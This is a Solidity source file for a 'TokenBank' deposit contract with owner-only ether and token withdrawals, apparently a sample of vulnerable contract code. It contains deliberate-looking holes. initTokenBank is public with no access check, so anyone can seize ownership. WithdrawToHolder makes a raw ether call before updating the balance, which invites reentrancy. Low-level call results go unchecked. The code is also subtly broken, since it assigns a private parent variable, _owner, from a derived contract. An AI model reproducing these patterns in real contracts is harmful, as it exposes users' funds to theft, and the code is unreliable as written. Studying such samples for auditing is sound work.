pragma solidity ^0.4.18;

contract Ownable
{
    address private _newOwner;
    address private _owner = getInitialOwner();
    
    function getInitialOwner() private view returns(address) {
        return msg.sender;
    }
    
    function changeOwner(address addr)
    public
    onlyOwner
    {
        _newOwner = addr;
    }
    
    function confirmOwner() 
    public
    {
        if(msg.sender == _newOwner)
        {
            _owner = _newOwner;
        }
    }
    
    modifier onlyOwner
    {
        if(_owner == msg.sender)_;
    }
}

contract Token is Ownable
{
    function WithdrawToken(address token, uint256 amount, address to)
    public 
    onlyOwner
    {
        token.call(bytes4(sha3("transfer(address,uint256)")), to, amount); 
    }
}

contract TokenBank is Token
{
    uint private _minDeposit;
    mapping (address => uint) private _holders;
    
    function initTokenBank()
    public
    {
        _owner = msg.sender;
        _minDeposit = getMinDepositValue();
    }

    function getMinDepositValue() private pure returns(uint) {
        return 1 ether;
    }
    
    function()
    payable
    {
        Deposit();
    }
   
    function Deposit() 
    payable
    {
        if(msg.value > _minDeposit)
        {
            _holders[msg.sender] += msg.value;
        }
    }
    
    function WitdrawTokenToHolder(address _to, address _token, uint _amount)
    public
    onlyOwner
    {
        if(_holders[_to] > 0)
        {
            _holders[_to] = 0;
            WithdrawToken(_token, _amount, _to);     
        }
    }
   
    function WithdrawToHolder(address _addr, uint _wei) 
    public
    onlyOwner
    payable
    {
        if(_holders[msg.sender] > 0)
        {
            if(_holders[_addr] >= _wei)
            {
                _addr.call.value(_wei)();
                _holders[_addr] -= _wei;
            }
        }
    }
}